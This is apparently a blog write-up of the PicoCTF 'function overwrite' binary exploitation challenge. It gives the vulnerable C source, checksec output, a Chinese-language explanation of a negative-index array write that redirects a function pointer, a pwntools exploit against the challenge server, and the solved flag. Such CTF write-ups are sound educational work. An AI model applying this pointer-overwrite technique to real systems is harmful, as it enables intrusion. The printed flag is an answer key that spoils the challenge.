---
title: PicoCTF - function overwrite
tags: [PicoCTF, CTF, PWN]

category: "Security Practice｜PicoCTF｜PWN"
date: 2024-01-31
---

# PicoCTF - function overwrite
<!-- more -->

## Background
Array Bound

## Source code
:::spoiler Source Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```
:::

## Recon
```bash!
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8b6f3ccbb344c3ba91ef077e29c8ab9d6e2da011, for GNU/Linux 3.2.0, not stripped
$ checksec vuln
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/function overwrite/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
這一題比想像中簡單，流程是這樣的，他的function pointer原本預設是指像hard_checker，而它裡面做的事情就是把我們輸入的所有字元以ascii的方式加總，如果加總的結果是13371337，就可以讀到flag，但是我們可以做一個簡單的換算，一個字元最多1 byte，也就是最大0xff，他設定最多只能輸入127個字元，代表0xff\*127=32385，遠遠低於13371337，而題目有提供另外一個checker也就是easy_checker，他只需要最後的加總是1337就可以了，代表完全有可能實現(例如：'z'\*10+'u'$\to$0x7a\*10+0x75)，現在的問題是要怎麼把一開始的function pointer指向easy_checker?

題目故意叫我們輸入兩個數字還特別在hint的地方說
> Don't be so negative
其實就是題是array bound的問題，所以簡單用gdb跟一下就可以換算fun array和check function pointer之間的差距還有該加上多少會變成easy_checker的地址

## Exploit
```python!
from pwn import *

# r = process('./vuln')
r = remote('saturn.picoctf.net', 58094)
easy_checker_addr = 0x080492fc
r.recvuntil(b'>> ')
r.sendline(b'z' * 10 + b'u')
r.recvline()
r.sendline(b'-16')
r.sendline(b'-314')

r.interactive()
```

Flag: `picoCTF{0v3rwrit1ng_P01nt3rs_ded38e3b}`